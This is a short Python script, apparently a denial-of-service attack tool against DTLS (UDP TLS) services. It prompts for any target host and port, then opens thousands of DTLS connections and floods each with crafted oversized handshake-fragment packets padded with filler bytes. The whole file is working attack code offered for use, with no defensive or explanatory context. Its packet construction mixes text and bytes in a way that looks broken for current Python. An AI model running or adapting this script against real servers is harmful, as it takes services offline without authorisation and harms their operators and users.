import struct
import ssl
import sys
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection

target = input("=> Target website/IP address : ")
port = int(input("=> Port number : "))

def open_socket(target1, port1):
    socket1 = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(socket1, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    socket1.connect((target1, port1))
    return socket1

def dos_packet(frag_no, frag_id):
    frag = "A" * 2000
    buffer1 = struct.pack("<HHHHH", 5, 2006, frag_id, frag_no, 2000)
    buffer1 += frag
    return buffer1

do_patch()
for i in range(5000):
    socket1 = open_socket(target, port)
    for j in range(10):
        packet = dos_packet(i, i)
        socket1.write(packet)
    socket1.close()